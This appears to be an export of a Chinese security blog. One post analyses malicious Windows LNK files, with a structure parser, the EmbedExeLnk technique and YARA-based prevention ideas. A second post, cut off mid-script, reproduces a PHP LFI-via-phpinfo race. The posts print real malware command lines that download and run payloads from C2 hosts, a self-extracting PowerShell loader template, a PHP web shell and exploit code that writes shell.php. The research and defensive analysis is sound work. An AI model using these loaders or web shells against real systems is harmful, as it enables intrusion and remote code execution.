
[{"content":"嗨 我貝坦\n時隔快半年的更新\u0026hellip;\n再來想研究安卓 game hacking\nDiscord 的 Nitro 沒了 qq\n上次更新時間: 2025-5-6\r","date":"6 May 2025","externalUrl":null,"permalink":"/","section":"betan423.github.io","summary":"嗨 我貝坦","title":"betan423.github.io","type":"page"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/tags/research/","section":"Tags","summary":"","title":"Research","type":"tags"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\r分析了 LNK file 是如何被用作攻擊，並從 LNK 結構開始介紹，並介紹攻擊手法 embedexelnk 是如何實現的，以及分析現有惡意程式並說明該如何預防\r前言 #\r在今年(2025)的資安大會中，\n聆聽了一場有關 LNK 文件是如何作為惡意軟體攻擊媒介的議程，\n這場議程引發了我對於這部分的研究興趣，\n也促使我開始深入研究 LNK 的相關內容。\n透過本文章，你將了解惡意軟體為何以及如何利用 LNK file 作為一階段的攻擊跳板，\n進一步了解 Embedexelnk 的攻擊手法，並說明如何預防此類威脅，\n而最後也會提供一些可行的預防建議與防護策略方向。\n另外，我也有在研究時隨手紀錄 hackmd，\n也歡迎一併查看。\nhttps://hackmd.io/@betan/HJhUTwmkge\n概念 #\rWHAT \u0026amp; WHY LNK #\r首先我們要先了解 LNK 檔案到底為何，\nLNK 檔案簡單來講就是我們常在桌面使用的連結，\n用於快速打開其他存放在電腦其他地方的檔案，\n正常的使用是這樣的。\n那為什麼駭客會使用 LNK 檔案當作第一階段的攻擊跳板呢？\n我認為主要原因有以下幾點，\n1. 正常介面中看不到副檔名 (.lnk)\n在一般使用者介面中，若有在檔案總管中開啟「顯示副檔名」的功能，\n則會顯示出各類型檔案的副檔名，例如 .exe, .jpg, .png 之類的檔案類型，\n但在 LNK 檔案中，並不會顯示出副檔名為.lnk，\n除非是在 cmd 中使用 dir 之類的功能才會顯示出 .lnk。\n2. Icon、 名稱、 描述都可以自訂\n如前面所提到的，由於不會顯示出副檔名，\n也因此檔案名稱就能起到很好的混淆，\n並且 LNK 檔的圖示(Icon)也能任意自訂，\n例如直接使用系統原生的圖示，又或是自己建立一個 .ico 的圖片來當作圖示，\n更甚至連描述都可以自訂為想要的內容，\n在正常連結中，當你把滑鼠放在該連結上，\n則會顯示出該連結最終指向的目標，例如 cmd.exe、 discord.exe， 但我們透過自訂描述，則可以任意修改該效果，\n變成讓它顯示出自訂的內容。\n例如透過將 LNK 檔案改名為 notepad.exe，\n並且修改 LNK 檔案的 Icon 為 notepad 的 Icon，\n最後再修改整體描述為一個正常的檔案描述，\n便能輕易偽裝成正常檔案。\n3. 好撰寫\n這部分其實有點見仁見智(?)，\n但對我這個開發能力滿爛的人，\n都能滿輕易理解整體結構並且撰寫出類似的 LNK 檔，\n大概就能說明這上手難度有多低了。\n手法 #\r通常使用 LOLBins(Living Off the Land Binaries) 來執行攻擊，\n例如 cmd, powershell, winrm, mshta 等內建工具，\n並且由於是透過呼叫本機就有的程式，\n因此也較不容易被偵測到惡意行為。\n可透過填充大量空格，使查看內容時只能看到一堆空白，\n在查看詳細內容中的目標欄位，最多只能顯示出259個字元(包含空格)，\n因此若將惡意 payload 寫在超出的範圍後，\n除非使用工具否則是不能查看該完整行為何的。\n檢視如下圖，可以看到在目標的欄位全部內容都是空白，\n這就是因為我們填充了大量的空格因此只能查看到空白。 LNK 結構 #\rLNK 檔案的結構如下，\nHeader –\u0026gt; TargetIDList(optional) –\u0026gt; LinkInfo(optional) –\u0026gt; StringData(optional) –\u0026gt; ExtraData(optional)\n這邊由於篇幅原因不全部介紹，\n只簡單介紹 Header 與 TargetIDList 的大致內容，\n若想了解其餘更詳細的部分，歡迎查看微軟官方撰寫的 LNK 結構介紹。\n[MS-SHLLINK]: Shell Link (.LNK) Binary File Format\nHeader Header 為所有 LNK 檔中的標準開頭格式，長度為 76 bytes， 在檔案的開頭都須按照這個固定格式來撰寫，否則將無法正常打開。 其中需特別注意 LinkFlags 的部分，\n該內容會決定到後續是否有 TargetIDList, LinkInfo 等結構。\n項目 bytes 內容 HeaderSize 4 固定0x0000004C LinkCLSID 16 固定0x00021401-0000-0000-C000-000000000046 LinkFlags 4 定義後續結構 FileAttributes 4 說明目標文件狀態 CreationTime 8 就是時間 AccessTime 8 就是時間 WriteTime 8 就是時間 FileSize 4 路徑目標大小 IconIndex 4 LNK ICON(通常為0) ShowCommand 4 設定目標如何啟動(內容固定為0x1, 0x3, 0x7) HotKey 2 開啟捷徑快捷鍵(注1) Reserved1 2 保留字元，必為0 Reserved2 4 保留字元，必為0 Reserved3 4 保留字元，必為0 注1:\nHotKey是我認為一個還滿酷的功能，\n該功能須將連結放置在桌面上才能生效，\nLowByte (前1 byte)為鍵盤按鍵(例如A,B,C\u0026hellip;) 、HighByte (後1 byte) 為 控制按鍵(ctrl, shift, alt)，\n假設設定成0x4301，代表同時按下 shift + B 即可開啟該 LNK 檔，\n且不論在哪個視窗按下都能開啟。\n因此如果將該熱鍵設定成 Ctrl + A 的話，\n就等於你每次使用全選功能時都會開啟該連結。\nTargetIDList\r需在 LinkFlags 定義有 HasTargetIDList 才會有該項目，\n接續在 Header 後， 前 2 bytes 為整個 TargetIDList長度，\n再來的內容都是不斷重複 長度(2 bytes)、內容(根據前面定義的長度)，\n直到最後跑完整個先前定義的長度。\n例如範例中的 0x00E7 (由於 little endian 所以要倒著看)代表整個 TargetIDList 的長度為 0xE7，\n而接下來的 0x14 則表示了 item 1 的整個長度為 0x14 bytes (包含定義長度的 2 bytes )，\n0x4E ~ 0x61 即為 item 1 的完整內容，\n而剩下的item也都是同樣格式，一直到跑完整個 TargetIDList 的長度。\n而我們透過了解整個 LNK 的結構後， 就能夠去撰寫一個簡易的 python 來去讀取整個 LNK file 的結構。\n以下程式碼只簡單讀取了 LinkFlags 與 TargetIDList 內容。\n展開程式碼\rdef LinkFlags(num): flags = [ (0, \u0026#39;HasLinkTargetIDList\u0026#39;), (1, \u0026#39;HasLinkInfo\u0026#39;), (2, \u0026#39;HasName\u0026#39;), (3, \u0026#39;HasRelativePath\u0026#39;), (4, \u0026#39;HasWorkingDir\u0026#39;), (5, \u0026#39;HasArguments\u0026#39;), (6, \u0026#39;HasIconLocation\u0026#39;), (7, \u0026#39;IsUnicode\u0026#39;), (8, \u0026#39;ForceNoLinkInfo\u0026#39;), (9, \u0026#39;HasExpString\u0026#39;), (10, \u0026#39;RunInSeparateProcess\u0026#39;), (11, \u0026#39;Unused1\u0026#39;), (12, \u0026#39;HasDarwinID\u0026#39;), (13, \u0026#39;RunAsUser\u0026#39;), (14, \u0026#39;HasExpIcon\u0026#39;), (15, \u0026#39;NoPidlAlias\u0026#39;), (16 , \u0026#39;Unused2\u0026#39;), (17, \u0026#39;RunWithShimLayer\u0026#39;), (18, \u0026#39;ForceNoLinkTrack\u0026#39;), (19, \u0026#39;EnableTargetMetadata\u0026#39;), (20, \u0026#39;DisableLinkPathTracking\u0026#39;), (21, \u0026#39;DisableKnownFolderTracking\u0026#39;), (22, \u0026#39;DisableKnownFolderAlias\u0026#39;), (23, \u0026#39;AllowLinkToLink\u0026#39;), (24, \u0026#39;UnaliasOnSave\u0026#39;), (25, \u0026#39;PreferEnvironmentPath\u0026#39;), (26, \u0026#39;KeepLocalIDListForUNCTarget\u0026#39;), ] enabled = [] for bit, name in flags: if (num \u0026gt;\u0026gt; bit) \u0026amp; 1: enabled.append(name) return enabled def FileAttributesFlags(num): flags = [ (0, \u0026#39;FILE_ATTRIBUTE_READONLY\u0026#39;), (1, \u0026#39;FILE_ATTRIBUTE_HIDDEN\u0026#39;), (2, \u0026#39;FILE_ATTRIBUTE_SYSTEM\u0026#39;), (3, \u0026#39;Reserved1\u0026#39;), (4, \u0026#39;FILE_ATTRIBUTE_DIRECTORY\u0026#39;), (5, \u0026#39;FILE_ATTRIBUTE_ARCHIVE\u0026#39;), (6, \u0026#39;Reserved2\u0026#39;), (7, \u0026#39;FILE_ATTRIBUTE_NORMAL\u0026#39;), (8, \u0026#39;FILE_ATTRIBUTE_TEMPORARY\u0026#39;), (9, \u0026#39;FILE_ATTRIBUTE_SPARSE_FILE\u0026#39;), (10, \u0026#39;FILE_ATTRIBUTE_REPARSE_POINT\u0026#39;), (11, \u0026#39;FILE_ATTRIBUTE_COMPRESSED\u0026#39;), (12, \u0026#39;FILE_ATTRIBUTE_OFFLINE\u0026#39;), (13, \u0026#39;FILE_ATTRIBUTE_NOT_CONTENT_INDEXED\u0026#39;), (14, \u0026#39;FILE_ATTRIBUTE_ENCRYPTED\u0026#39;) ] enabled = [] for bit, name in flags: if (num \u0026gt;\u0026gt; bit) \u0026amp; 1: enabled.append(name) return enabled def rev(bt): # little endian 換 big endian bytes_data = bytes.fromhex(bt) reordered = bytes_data[::-1] # 反轉 linkflags_int = int.from_bytes(reordered, byteorder=\u0026#39;big\u0026#39;) return linkflags_int def read_lnk_structure(data): structure = {} # 檢查開頭的 20 bytes (HeaderSize) header_size = data[:20] if header_size == b\u0026#39;\\x4C\\x00\\x00\\x00\\x01\\x14\\x02\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\u0026#39;: structure[\u0026#39;HeaderSize_Valid\u0026#39;] = True else: print(\u0026#39;Wrong file! NOT LNK file\u0026#39;) return \u0026#39;-1\u0026#39; # LinkFlags (4 bytes) link_flags = data[20:24] structure[\u0026#39;LinkFlags\u0026#39;] = LinkFlags(rev(link_flags.hex())) # FileAttributesFlags (4 bytes) File_Attributes_Flags = data[24:28] structure[\u0026#39;FileAttributesFlags\u0026#39;] = FileAttributesFlags(rev(File_Attributes_Flags.hex())) # HotKey (2 bytes) Hot_Key = data[0x40:0x42] if (Hot_Key == b\u0026#39;\\x00\\x00\u0026#39;): structure[\u0026#39;HotKey\u0026#39;] = \u0026#39;NO\u0026#39; else: key =\u0026#39;\u0026#39; if data[0x41] \u0026amp; 0x01: key+=(\u0026#39;SHIFT \u0026#39;) if data[0x41] \u0026amp; 0x02: key+=(\u0026#39;CTRL \u0026#39;) if data[0x41] \u0026amp; 0x04: key+=(\u0026#39;ALT \u0026#39;) structure[\u0026#39;HotKey\u0026#39;] = chr(data[0x40]) , key return structure def check_item(data,num,ed): item = [] ed-=2 while ed != 0: size = rev(data[num:num+2].hex()) ed -= size item.append(data[num:num+size]) num = num+size return item def LinkTargetIDList(data): size = rev(data [76:78].hex()) item =check_item(data,78,size) for idx, content in enumerate(item, start=1): hex_string = \u0026#39;\u0026#39;.join(f\u0026#39;\\\\x{b:02x}\u0026#39; for b in content) print(f\u0026#34;item {idx}: {hex_string}\u0026#34;) return 78+size def HasLinkInfo(data): print(\u0026#39;test\u0026#39;) return 1 if __name__ == \u0026#34;__main__\u0026#34;: lnk_path = \u0026#34;Your path\u0026#34; with open(lnk_path, \u0026#39;rb\u0026#39;) as f: data = f.read() result = read_lnk_structure(data) for k, v in result.items(): print(f\u0026#34;{k}: {v}\u0026#34;) if \u0026#39;HasLinkTargetIDList\u0026#39; in (result[\u0026#39;LinkFlags\u0026#39;]): print(\u0026#39;--- has TargetIDList ---\u0026#39;) now = LinkTargetIDList(data) print(now) if \u0026#39;HasLinkInfo\u0026#39; in (result[\u0026#39;LinkFlags\u0026#39;]): print(\u0026#39;--- has HasLinkInfo ---\u0026#39;) HasLinkInfo(data) print(now) EmbedExeLnk #\r本內容參考由 d4rkiZ 改良過後的 EmbedExeLnk 技巧。\nd4rkiZ/EmbedExeLnk-\rEmbedExeLnk by x86matthew modified by d4rkiZ\rC\u0026#43;\u0026#43; 42\r11\r概念 #\r由於 LNK 檔對於結構的檢查並沒有很嚴苛，\n因此我們可以塞任意內容到 LNK 檔的末端都不會影響到檔案的開啟。\n而這個攻擊手段就是透過內嵌 exe 檔到 LNK 檔的末尾中，\n以達到不需要到 C2 下載檔案就能執行惡意程式的操作，\n但也並非只有 exe 檔才可以使用此技巧，\n基本上任何格式的內容都可以嵌到 LNK 檔的末端。\nLinkFlags 內容 #\r這邊先查看一下他在 LinkFlags 中使用了那些項目以及功能為何。\nLinkFlags HasName (用於新增描述) saved with a name string, NAME_STRING StringData structure must be present HasArguments (使用環境變數) has command line arguments，COMMAND_LINE_ARGUMENTS StringData structure must be present HasIconLocation (自訂 Icon) ICON_LOCATION StringData structure MUST be present IsUnicode StringData contains Unicode-encoded strings HasExpString 有環境變數內容，需再EnvironmentVariableDataBlock設定 PreferEnvironmentPath 沒有ID list，用環境變數替代 The target IDList SHOULD NOT be stored; instead, the path specified in the EnvironmentVariableDataBlock (section 2.5.4) SHOULD be used to refer to the target. 不使用常見的TargetIDList ，而是透過 PreferEnvironmentPath 將內容丟到 ExtraData\nCommand line arguments #\r透過先開啟 Google Chrome 內建的弱密碼本，\n來欺騙被害者以為開啟的是正常 txt 文件，\n而後透過先遍歷整個當前目錄的所有 lnk 檔案，來找到此惡意 LNK，\n接著讀取 LNK 中最末端加密後的 exe 檔內容，解密並存放到 tmp 檔中，\n最後就是執行該 exe 檔。\n/c start notepad C:\\\\%%HOMEPATH%%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData\\\\3\\\\passwords.txt \u0026amp;\u0026amp; powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = \u0026#39;%%temp%%\\\\tmp\u0026#39; + (Get-Random) + \u0026#39;.exe\u0026#39;; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^\u0026amp; $path; 我們在執行該 lnk 檔後，可以看到就開啟了弱密碼 txt 本，\n以及也運行了我撰寫的一個簡單 MessageBox exe file，\n就這樣收到了一份洗劫獅送來的傳票了。 結構分析 #\r我們從程式碼來看，可以看到其中定義的結構如下，\nheader \u0026ndash;\u0026gt; description_length \u0026ndash;\u0026gt; description \u0026ndash;\u0026gt; CommandLineArguments \u0026ndash;\u0026gt; IconLocationLength \u0026ndash;\u0026gt; IconLocation \u0026ndash;\u0026gt; EnvironmentVariableDataBlock \u0026ndash;\u0026gt; ExeFile\n其中 description, CommandLineArguments, IconLocation 位於 StringData 中，\nEnvironmentVariableDataBlock 則是位於 ExtraData 中。\nHeader (0 ~ 4B bytes)\n結構就如\r前面 所提及，這邊就不過多贅述。 由於大多數結構都不影響 LNK 檔， 因此這邊就將其餘數值都填 0。 StringData - NAME_STRING (4C ~ CF bytes)\n解釋一下長度， 0x41 = 65 ，然後我們需要將長度 * 2 才會是後續內容的長度，因此 65 * 2 = 130 ， 後續內容從 4E ~ D0 的長度就剛好是130 StringData - COMMAND_LINE_ARGUMENTS (D0 ~ 885 bytes)\nStringData - ICON_LOCATION (886 ~ 8C1 bytes)\nExtraData - ENVIRONMENT_PROPS (8C2 ~ BD6 bytes)\nexe file (BD6 ~ FDD6 bytes)\nxor 0x77 後的內容，這邊就不過多贅述 實例 #\r這邊將分析五個實際的樣本，其中三個為議程中提及到的樣本，\n剩下一個是野外的 LNK 惡意程式，最後一個則是使用了 Embedexelnk 的技巧。\n本次研究主要是研究 LNK 的惡意行為，\n因此沒有再對後續的惡意程式進行更進一步的分析。\nPuppetFox, RolandSkimmer, Confucius #\r由於本部分都沒有下載到原始樣本，\n因此這邊我只能透過去 VirusTotal 進行查詢，\n但幸運的是，在 VT 中就能查看詳細的 LNK 指向目標內容了！\n由於在 VT 中會自動將過長的內容後續省略為 \u0026hellip;\n但我們能透過直接對該項目透過開啟 F12 來查看完整內容，\n又或是也能在 BEHAVIOR 中的 Processes created 看到完整進程。\nBro 以為自己在打 CTF 找 Flag\nHash 值:\nPuppetFox 3d8db6e02bd11a4366b02bfb94593ff410d183a94134933121c806a5f175f8a3 RolandSkimmer 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1 Confucius 4206ab93ac9781c8367d8675292193625573c2aaacf8feeaddd5b0cc9136d2d1 PuppetFox 透過 Windows 內建的工具 Winrm 來執行惡意行為，\n先透過 cmd 開啟 winrm，並透過 /c 來讓 cmd 在執行後關閉，\nstart 使用最小化( /min )、不開啟新視窗( /B )來啟動 winrm，\nmsiexec 使用不顯示任何對話框或 UI( /q, /qn )，來安裝( /i )後續的 msi檔。 因此推測該 C2 server 內容應該就是一個惡意的 msi 檔。\n在 cmd 中輸入 msiexec /?, start /?, cmd /? 可查看所有相關 / 指令應用。\nCommand line arguments:\ncmd.exe /c \u0026#34;\u0026#34;C:\\Windows\\System32\\winrm.cmd\u0026#34; \u0026amp; start /min /b msiexec\u0026amp;\u0026amp; start /min /B msiexec /q /i http://154.201.83.175:3989/@ /qn\u0026#34; RolandSkimmer 透過 mshta.exe 來執行後續惡意 VBScript 腳本，\n透過 createobject 建立一個 mi1 物件，\n接著透過該物件向 C2 發送 GET 請求，\n並替換收到的回應中的 # 改為隨機數並執行，\n回應的部分應該就是具體的惡意行為了。\n而我們能發現到它有定義一個隨機數的部分，\n透過查看 VT 可以在 Contacted URLs 中發現到有許多的 URL，\n大多都只是 V 值不同，\n因此推測收到的回應內容應該就包含這部分V=#。\nCommand line arguments:\n\u0026#34;C:\\wINdOwS\\SySTeM32\\MsHTa.eXe\u0026#34; vbscript:execute(\u0026#34;set mi1=createobject(\u0026#34;\u0026#34;msxml2.serverxmlhttp.6.0\u0026#34;\u0026#34;): mi1.open \u0026#34;\u0026#34;get\u0026#34;\u0026#34;,\u0026#34;\u0026#34;http://invsetmx.com/ipa.aspx\u0026#34;\u0026#34;,false: mi1.send(): randomize: r=int(rnd*99999): execute(replace(mi1.responsetext,\u0026#34;\u0026#34;#\u0026#34;\u0026#34;, r)):\u0026#34;) (WiNdOW.ClOsE) Confucius 先將本機合法程式 fixmapi.exe 複製到 AppData\\Local\\BlueAle.exe，\n接著執行混淆過後的指令，解混淆後可以得出下列內容，\n可以看到去 C2 下載一個 dll，然後再下載一個 file.pdf 儲存在 tmp 資料夾，\n最後則是去開啟該 pdf，然後睡五秒後去執行 BlueAle.exe，\n這邊使用到了 dll sideloading 的技巧來運行惡意 dll。\nCommand line arguments:\n\u0026#34;powershell.exe\u0026#34; -C \u0026#34;$pa=$env:LocalAppData; $c=$pa+\u0026#39;\\BlueAle.exe\u0026#39;; Copy C:\\Windows\\System32\\fixmapi.exe $c; 437,455,452,446,370,383,449,370,378,374,450,435,370,381,370,377,430,447,435,450,443,453,454,455,436,384,438,446,446,377,379,370,372,442,454,454,450,453,396,385,385,450,439,454,452,443,437,441,452,439,439,448,384,443,448,440,449,385,420,418,426,408,406,389,394,425,403,418,420,393,384,452,445,449,372,397,374,444,399,374,439,448,456,396,422,415,418,370,381,370,377,430,440,443,446,439,384,450,438,440,377,397,370,437,455,452,446,370,383,449,370,374,444,370,372,442,454,454,450,453,396,385,385,450,439,454,452,443,437,441,452,439,439,448,384,443,448,440,449,385,404,425,416,395,428,403,418,384,452,445,449,372,397|%{$x+=[char]($_-338)}; $x|IEX; start $j; Start-Sleep -Seconds 5; start $c\u0026#34; 解混淆中間的內容:\ncurl -o ($pa + \u0026#39;\\mapistub.dll\u0026#39;) \u0026#34;https://petricgreen.info/RPXFD38WAPR7.rko\u0026#34;; $j=$env:TMP + \u0026#39;\\file.pdf\u0026#39;; curl -o $j \u0026#34;https://petricgreen.info/BWN9ZAP.rko\u0026#34;; Scanned-Doc-t00778886867-QUO.LNK #\r在這個案例中比較值得一提的是，\n並非使用常見的 C2 來存放惡意軟體，\n而是透過雲託管服務來存放惡意軟體，\n在資安大會的其他場議程中也有提及到，\n現在這種使用第三方免費服務的攻擊越來越多，\n而且也能在進行完攻擊後就刪除，使研究員難以查詢。\n而我也有找到一些該 LNK 的變體，\n可以發現到他唯一的差別都只有使用不同的雲託管服務，\n其他的不論是檔案名稱或是攻擊內容則都是相同的。\nCommand line arguments:\npowershell -WindowStyle hidden -Command (new-object System.Net.WebClient).DownloadFile(\u0026#39;\u0026#39;https://link.storjshare.io/raw/jvkur67ttk7yuzdriwaa3ufnlwra/my-newupload/newfile.txt\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\\\ProgramData\\\\HEW.GIF\u0026#39;\u0026#39;); $file = \u0026#39;\u0026#39;C:\\\\ProgramData\\\\HEW.GIF\u0026#39;\u0026#39;; [System.Convert]::FromBase64String((Get-Content $file)) | Set-Content C:\\\\ProgramData\\\\CHROME.PIF -Encoding Byte; start C:\\\\ProgramData\\\\CHROME.PIF;\u0026#39; Hash:\nScanned-Doc-t00778886867-QUO.LNK 3107d53f9e37c496f08e3742c379976a80f7297c192aba5b8eb7c5f29af18f33 Embedziplnk #\r在連結中嵌入 zip 而非先前提及到的 exe，\n但整體邏輯仍一樣。\n一樣遍歷當前目錄的所有檔案找出該 lnk 檔，\n然後把 zip 存放到 tmp 中，解壓縮並執行其中的惡意軟體。\n去查看該檔案的十六進制格式，透過觀察末端內容的 Header ，\n發現他就是正常 zip file 的 header，並沒有做加密之類的，\n而我們簡單寫一個提取腳本出來，\n發現末端就真的是 zip 檔案，解壓縮後也有後續攻擊提到的 5.9.82.114.exe。\nCommand line arguments:\npowershell -windowstyle hidden $jhelpfule=[system.io.file]::ReadAllBytes((dir *.lnk ^| ? {$_.length -ge 00202000} ^| select -ExpandProperty FullName)); $oprototypez = \u0026#39;\u0026#39;%LOCALAPPDATA%\\tmp\u0026#39;\u0026#39; + (Get-Random) + \u0026#39;\u0026#39;.zip\u0026#39;\u0026#39;; $oprototypez = [Environment]::ExpandEnvironmentVariables($oprototypez); $vplanz = [System.IO.Path]::GetDirectoryName($oprototypez); [System.IO.File]::WriteAllBytes($oprototypez, $jhelpfule[ 3478..($jhelpfule.length)]); cd $vplanz;Expand-Archive $oprototypez . -EA 0 -Force ^| Out-Null; del $oprototypez -EA 0 -Force ^| Out-Null; ^\u0026amp; .\\5.9.82.114.exe\u0026#39; Hash:\n[Embedexelnk] Court order No.RY4577-71 (mandatory to comply 4a07b3fbfd385f067e892a385d63667ba9a6d89f9d49f3736de84c94282e28e5 預防與防治 #\r我們透過去學習了 LNK file 的結構，\n以及上述的實例分析，\n多少能找到一些惡意連結的特徵，\n因此以下是一些我認為能夠作為實際預防手段的方向。\n結構 #\r看到這裡，我們已經學習到了基本的 LNK file 的結構，\n並且也進行了一些實例分析後，\n我們也大致能從這些案例分析中找到一些規律，\n也因此就能夠去根據這部分的概念來撰寫例如 yara rule 或是其他檢測工具的偵測機制。\n例如我們在上述學習 Embedexelnk 的時候可以發現他都有 PreferEnvironmentPath 的內容，\n因此我們就能寫一個條件是，在 LinkFlags 中存在 PreferEnvironmentPath 就可以標記為可疑之類的。\nyara rule 簡單範例:\nrule LNK_PreferEnvironmentPath {\rcondition:\r(uint32(0x14) \u0026amp; 0x00002000) != 0\r} 當然也不是限定說只有這一個項目，但剩下的就歡迎各位去自己研究後再來判讀了。\n又或是我們也能使用機器學習的方式來辦別，\n例如透過檢測 LNK 檔中 LinkFlags 中的所有項目，用來建立一個項目表之類的，\n再丟給模型去訓練讓他判讀，\n這部分未來如果有機會的話我應該會去實作，\n又或是你有其他想法或是想一起製作的話也能來 DM 我一起討論之類的。\n系統 #\r這部分主要是我認為現行的 LNK 檔該如何預防，\n以及對於未來系統建議的改良方向\u0026hellip;?\n我們可以透過檔案總管查看項目類型，在項目類型會明確顯示出 捷徑，\n這大概會是比較明確指出這是 LNK 檔的最大跡象，\n所以如果真的是需要去開啟一些奇怪檔案的時候，\n建議可以在檔案總管處先去詳細確認一下檔案類型。\n而 LNK 檔還有一大特徵就是他的 Icon 左下角有一個箭頭符號，\n雖然有顯示，但不多，畢竟現在人均老花(X\n而且大多人也不會去特別查看 Icon 的角落之類的，\n因此我認為直接放大那個箭頭，又或是新增其他能夠區別 Icon 的方式。\n最後則是新增顯示 .lnk 字尾，雖然並非所有使用者都會開啟顯示副檔名，\n但我認為如果能直接顯示出 .lnk 結尾的話多少也能起到一些防護功能。\n總結 #\r這種透過 LNK 檔的攻擊手段在很早之前就出現過了，\n我認為除非微軟有打算大改他們的系統，\n否則這種類型的攻擊在未來也仍然會十分常見，\n因此養成一個不要亂點奇怪檔案的習慣才是一個正確的網路公民喔！\n笑死 這甚麼超爛的小學作文結尾，\n感謝所有願意看到這裡的人，\n我知道我文章排版滿醜的\u0026gt;\u0026lt;\n有任何疑問或是建議都可以和我說。\n至此，藝術已成\r參考來源 #\rHow to use Shortcut LNK Files on Windows - Malware Delivery Initial Access\nEmbedExeLnk - 在LNK内嵌入EXE并自动执行 d4rkiZ/EmbedExeLnk\n","date":"6 May 2025","externalUrl":null,"permalink":"/posts/013_lnkresearch/","section":"Posts","summary":"分析了 LNK file 是如何被用作攻擊，並簡單介紹了 LNK 的結構，以及相關攻擊手法、並分析惡意程式，最後說明該如何預防","title":"當連結成為駭客利器：分析LNK攻擊與防禦技巧","type":"posts"},{"content":"","date":"30 December 2024","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"\r據說是一個php上的經典老洞(?\r前前言 #\r由於自己電腦環境一直無法順利執行成功，因此最後就放棄此漏洞的實作，\n但文章打都打了，不發也是白打，\n應該是我自己電腦的問題，歡迎大家也去嘗試看看能否成功，\n或是來私訊跟我討論，謝謝大家。\n前言 #\r有幸參與了台灣好厲駭邀請業界知名大神 orange 所舉辦的Web Security 輕鬆談，本次課程真的受益許多，真的很推薦所有有參加台灣好厲駭的都可以去報名，好去愛去 明年還去(X\n總之在課程中有提到在php中有個LFI的漏洞，在聽完敘述還有稍微實際操作後感到滿有興趣的，因此想說課後要來自己實際操作一次該漏洞，於是就有本篇了\n本次一樣有將復現內容放在我個人的github上，歡迎大家一起跟著實際操作看看\nBetan423/LFI-With-PHPInfo-PoC\rnull 0\r0\r漏洞介紹 #\r在 php 的配置文件中，預設了一項 file_uploads = on ，而該設定則會導致一個神奇的特性，\n即使在頁面中，沒有設有接收輸入值的部分，例如單純的 phpinfo() 介面，\n但如果仍發送內容過去， php 並不會無視這些內容，而是會將其作為暫存檔儲存，\n直到整個要求完整跑完後，若都沒有存取到剛剛輸入的內容，則才會將剛剛傳入的內容刪除。\n如果只是這樣還沒有太大的問題，因為暫存檔的檔名都是隨機產生的，\n(例如在Windows中的型式是php****.tmp)\n但在 phpinfo 中，卻會顯示出所有接受到的值，並將他們的資訊都列出來，\n(例如檔名、路徑等，下方復現的部分有例圖)\n也因此就會導致先前傳送的暫存檔檔名leak，\n而我們這時就能透過LFI的漏洞去存取到剛剛傳入的惡意payload，\n最後以此來達到RCE的效果。\n復現 #\r復現邏輯 #\r我們透過向伺服器傳送一個其中帶有惡意 payload 的 request ，\n並且在該 request 中添加大量的A來 padding ，用意是為了讓網頁處理該封包時速度變慢，\n因為我們上述有提到說在該要求運行結束後，若是沒有存取到剛剛傳入的內容，則會將其刪掉，\n因此我們透過填充大量字元，來減緩伺服器處理該封包的速度，以便讓我們來得及去存取剛才傳入的 payload ，\n最後透過LFI漏洞來存取剛剛輸入的 payload ，即可順利 RCE 。\n暫存檔 #\r我們一開始先透過 burp suite ，在 phpinfo的介面中隨便發送一個內容，\n(記得將 http request 改成 POST) 在該頁面中，是沒有任何會接收輸入值的內容，\n但我們透過查詢 phpinfo 介面，\n卻會發現他仍然有將我們剛剛所傳送的內容，\n保存在 php87F2.tmp 中。 該暫存檔具體內容真的是剛剛所傳送的內容嗎？\n我們這邊寫一個腳本來查看該暫存檔，\n可以發現到，其中真的就是我們剛剛所輸入的test。\n(腳本有時候會抓不到tmp檔，多試幾次就可以了) 不知道各位看到這裡會不會好奇一件事，\n直接去存取tmp檔案就能順利執行惡意代碼了嗎？\n因此我們這邊先來做個小實驗，透過在伺服器同目錄下建立一個 phpTEST.tmp ，\n並將其中內容建立為簡單的 php 的 web shell，\n\u0026lt;?php passthru($_GET[\u0026#34;f\u0026#34;]);?\u0026gt; 而實際去存取該檔案可以看到，已經是順利執行 web shell 的內容了，\n也因此我們後續如果成功將 web shell 寫入暫存檔後，只需要直接去存取該檔案就能順利運行了。\nLFI to RCE #\r我們透過 socket 來不斷對 phpinfo 發送大量封包，以達到減緩伺服器刪除tmp檔案速度，\n並在讀取送回內容時進行快速讀取，\n以便在查找到 tmp 檔的第一時間就透過 LFI 漏洞去存取該 web shell， 最終就成功順利植入 web shell。\n在 github repo 中，ans001 與 ans002 為別人撰寫的 poc 腳本，可以一起嘗試看看是否能順利運行。\nimport socket import threading # 設定request def setup(host,port): padding = \u0026#34;A\u0026#34; * 5000 TAG = \u0026#34;Security Test\u0026#34; PAYLOAD = \u0026#34;\u0026#34;\u0026#34;%s\\r \u0026lt;?php $c=fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;);fwrite($c,\u0026#39;\u0026lt;?php passthru($_GET[\u0026#34;f\u0026#34;]);?\u0026gt;\u0026#39;);?\u0026gt;\\r\u0026#34;\u0026#34;\u0026#34; % TAG # 請求的正文部分 body = f\u0026#34;\u0026#34;\u0026#34; ------WebKitFormBoundaryfHfyAsoxPPUAHIAj\\r Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;test.txt\u0026#34;\\r Content-Type: text/plain\\r \\r {PAYLOAD} \\r ------WebKitFormBoundaryfHfyAsoxPPUAHIAj--\\r \u0026#34;\u0026#34;\u0026#34; # 計算 Content-Length content_length = 